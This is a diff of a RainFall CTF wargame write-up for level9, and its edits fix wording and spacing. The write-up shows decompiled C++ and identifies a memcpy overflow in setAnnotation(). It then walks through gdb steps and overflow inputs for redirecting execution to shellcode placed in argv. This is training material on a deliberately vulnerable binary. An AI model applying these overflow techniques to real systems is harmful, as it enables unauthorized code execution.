@@ -95,13 +95,11 @@ End of assembler dump.
 
 ```
 
-
-In the functions informations, we guess the binary comes from c++, since its using the STD.
+In the function information, we guess the binary comes from c++, since its using the STD.
 
 ```c++
 
 void __thiscall N::N(N *this,int param_1)
-
 {
   *(undefined ***)this = &PTR_operator+_08048848;
   *(int *)(this + 0x68) = param_1;
@@ -109,7 +107,6 @@ void __thiscall N::N(N *this,int param_1)
 }
 
 void __thiscall N::setAnnotation(N *this,char *param_1)
-
 {
   size_t __n;
   
@@ -119,7 +116,6 @@ void __thiscall N::setAnnotation(N *this,char *param_1)
 }
 
 void main(int param_1,int param_2)
-
 {
   N *this;
   undefined4 *this_00;
@@ -153,8 +149,7 @@ level9@RainFall:~$ echo $?
 level9@RainFall:~$ 
 ```
 
-
-The function setAnnotation execute the memcpy so we can overflow the program.
+The function setAnnotation() execute memcpy(), so we can overflow the program.
 
 ```sh
 level9@RainFall:~$ ./level9 $(python -c "print 'A' * 109")
@@ -167,7 +162,7 @@ We are going to make the programs points to our shellcode, for that we are going
 Im gonna push the shellcode into av[2], so we need his address.
 
 
-Lets put a breakpoint right after the setAnnotation function.
+Lets put a breakpoint right after the setAnnotation() function.
 ```sh
 (gdb) br *main+136
 Breakpoint 1 at 0x804867c
@@ -176,6 +171,7 @@ Breakpoint 1 at 0x804867c
 
 
 Now we are going to put some flag at av[1] and av[2] adress like that
+
 ```sh
 (gdb) run $(python -c "print 'A' * 108") $(python -c "print 'B' * 108")
 (gdb) x/200x $esp
@@ -231,6 +227,7 @@ Now we are going to put some flag at av[1] and av[2] adress like that
 0xbffff910:	0x32342032	0x53003234	0x545f4853	0x2f3d5954
 
 ```
+
 0x42 is the B, so av[2] start at 0xbfff860 + 8 = 0xbfff868.
 
 Then we are going to overwrite EAX so it points to that address, (a pointer to a pointer basically).
